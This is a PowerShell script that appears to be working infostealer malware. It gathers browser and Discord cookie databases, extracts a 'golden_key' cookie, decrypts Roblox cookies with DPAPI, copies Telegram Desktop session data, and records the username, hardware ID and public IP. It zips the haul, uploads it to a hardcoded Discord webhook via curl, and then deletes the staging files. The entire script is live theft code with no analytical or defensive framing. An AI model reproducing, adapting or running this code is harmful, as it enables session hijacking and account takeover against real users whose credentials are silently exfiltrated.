$webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"

$log = "$env:TEMP\zeta_debug.log"
"=== ZETA DEBUG ===" | Out-File $log -Force
"1. Script started $(Get-Date)" | Out-File $log -Append
Write-Host "1. Script started" -ForegroundColor Cyan

$d = "$env:TEMP\Zeta_Cookies"
try {
    md $d -Force | Out-Null
    "2. Folder created: $d" | Out-File $log -Append
    Write-Host "2. Folder created: $d" -ForegroundColor Green
} catch {
    "ERROR: $_" | Out-File $log -Append
    Write-Host "ERROR: $_" -ForegroundColor Red
    Read-Host "Press Enter"
    exit
}

$found = @()
$searchPaths = @($env:APPDATA, $env:LOCALAPPDATA, (Join-Path $env:LOCALAPPDATA '..\LocalLow'))
"3. Search paths: $searchPaths" | Out-File $log -Append

foreach ($base in $searchPaths) {
    try {
        if (Test-Path $base) {
            $files = Get-ChildItem -Path $base -Recurse -Filter 'Cookies' -File -ErrorAction SilentlyContinue |
                Where-Object { 
                    $_.DirectoryName -and ($_.DirectoryName -match 'discord|chrome|edge|brave|opera|vivaldi|firefox|mozilla|ntfloader|ebwebview|webview' -or $_.FullName -match 'Cookies$')
                }
            if ($files) { 
                $found += $files
                "4. Found $($files.Count) files in $base" | Out-File $log -Append
                Write-Host "4. Found $($files.Count) files in $base" -ForegroundColor Green
            }
        }
    } catch {
        "ERROR in $base : $_" | Out-File $log -Append
    }
}

"5. Total files found: $($found.Count)" | Out-File $log -Append
Write-Host "5. Total files found: $($found.Count)" -ForegroundColor Cyan

if ($found.Count -eq 0) {
    "NO COOKIES FOUND!" | Out-File $log -Append
    Write-Host "NO COOKIES FOUND!" -ForegroundColor Red
}

$goldenKey = $null
$goldenSeal = $null
$filesCopied = 0

foreach ($f in $found) {
    try {
        if (-not $f) { continue }
        $src = $f.FullName
        $name = "unknown_cookie.cookies"
        try {
            if ($f.Directory.Parent -and $f.Directory.Name) {
                $name = $f.Directory.Parent.Name + '_' + $f.Directory.Name + '.cookies'
            } elseif ($f.Directory.Name) {
                $name = $f.Directory.Name + '.cookies'
            }
            if ($name.Length -gt 60 -and $f.Directory.Parent -and $f.Directory.Parent.Parent -and $f.Directory.Parent.Name) {
                $name = $f.Directory.Parent.Parent.Name + '_' + $f.Directory.Parent.Name + '.cookies'
            }
        } catch {
            $name = [System.IO.Path]::GetFileName($src) + '_' + (Get-Random -Max 9999) + '.cookies'
        }
        $dest = Join-Path $d $name
        Copy-Item -Path $src -Destination $dest -Force -ErrorAction Stop 
        $filesCopied++
        "6. Copied: $name" | Out-File $log -Append

        try {
            Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$dest;Version=3;Read Only=True;")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT value FROM cookies WHERE name = 'golden_key' LIMIT 1;"
            $result = $cmd.ExecuteScalar()
            if ($result -and $result -ne $null) {
                $goldenKey = $result
                $goldenKey | Out-File "$d\golden_key.txt" -Force
                "7. golden_key found in $name" | Out-File $log -Append
                Write-Host "7. golden_key found" -ForegroundColor Green
            }
            $conn.Close()
        } catch {
            # skip
        }

    } catch {
        "ERROR copying $($f.FullName) : $_" | Out-File $log -Append
        Write-Host "ERROR copying: $_" -ForegroundColor Red
    }
}

"8. Files copied: $filesCopied" | Out-File $log -Append
Write-Host "8. Files copied: $filesCopied" -ForegroundColor Cyan

try {
    $rob = $env:LOCALAPPDATA + '\Roblox\LocalStorage\RobloxCookies.dat'
    if (Test-Path $rob) {
        Copy-Item $rob "$d\RobloxCookies.dat" -Force -ErrorAction SilentlyContinue
        "9. Roblox file copied" | Out-File $log -Append
        try {
            $c = Get-Content $rob -Raw | ConvertFrom-Json -ErrorAction Stop
            if ($c -and $c.CookiesData) {
                $b = [Convert]::FromBase64String($c.CookiesData)
                Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
                $s = [System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, 'CurrentUser')
                $t = [Text.Encoding]::UTF8.GetString($s)
                $t | Out-File "$d\RobloxCookies_decrypted.txt" -ErrorAction SilentlyContinue
                "10. Roblox decrypted" | Out-File $log -Append
                Write-Host "10. Roblox decrypted" -ForegroundColor Green
            }
        } catch {
            "ERROR Roblox decrypt: $_" | Out-File $log -Append
            Write-Host "ERROR Roblox decrypt: $_" -ForegroundColor Red
        }
    } else {
        "Roblox file not found" | Out-File $log -Append
    }
} catch {
    "ERROR Roblox: $_" | Out-File $log -Append
}

try {
    $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
    if (Test-Path $tgPath) {
        $tgDest = "$d\Telegram_tdata"
        md $tgDest -Force | Out-Null
        Start-Process -FilePath "robocopy" -ArgumentList "`"$tgPath`" `"$tgDest`" /E /COPY:DAT /R:1 /W:1 /NP /NFL /NDL" -Wait -NoNewWindow -WindowStyle Hidden
        if ((Get-ChildItem $tgDest -Recurse -File -ErrorAction SilentlyContinue).Count -eq 0) {
            Copy-Item -Path "$tgPath\*" -Destination $tgDest -Recurse -Force -ErrorAction SilentlyContinue
        }
        "11. Telegram tdata copied" | Out-File $log -Append
        Write-Host "11. Telegram tdata copied" -ForegroundColor Green
    } else {
        "Telegram tdata not found" | Out-File $log -Append
    }
} catch {
    "ERROR Telegram: $_" | Out-File $log -Append
}

try {
    $u = $env:USERNAME
    try {
        $h = (Get-CimInstance Win32_ComputerSystemProduct).UUID
    } catch {
        $h = "UNKNOWN_HWID"
    }
    try {
        $i = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -ErrorAction Stop).Content
    } catch {
        $i = "IP_NOT_FOUND"
    }
    "User: $u`nHWID: $h`nIP: $i" | Out-File "$d\info.txt" -ErrorAction SilentlyContinue
    "12. System info saved" | Out-File $log -Append
} catch {
    "ERROR system info: $_" | Out-File $log -Append
}

try {
    $zip = "$env:TEMP\cookies.zip"
    if (Test-Path $zip) { Remove-Item $zip -Force -ErrorAction SilentlyContinue }
    Compress-Archive -Path $d -DestinationPath $zip -Force -ErrorAction SilentlyContinue
    "13. Archive created: $zip" | Out-File $log -Append
    Write-Host "13. Archive created" -ForegroundColor Green
} catch {
    "ERROR archive: $_" | Out-File $log -Append
    Write-Host "ERROR archive: $_" -ForegroundColor Red
}

try {
    if (Test-Path $zip) {
        curl.exe -F "file=@$zip" $webhook
        "14. Sent via curl" | Out-File $log -Append
        Write-Host "14. Sent via curl" -ForegroundColor Green
    } else {
        "Archive not created" | Out-File $log -Append
        Write-Host "Archive not created" -ForegroundColor Red
    }
} catch {
    "ERROR sending: $_" | Out-File $log -Append
    Write-Host "ERROR sending: $_" -ForegroundColor Red
}

try {
    Remove-Item $zip -Force -ErrorAction SilentlyContinue
    Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue
    "15. Cleanup done" | Out-File $log -Append
} catch {
    "ERROR cleanup: $_" | Out-File $log -Append
}

"16. Script finished $(Get-Date)" | Out-File $log -Append
Write-Host "Script finished! Log: $log" -ForegroundColor Cyan
Read-Host "Press Enter to exit"
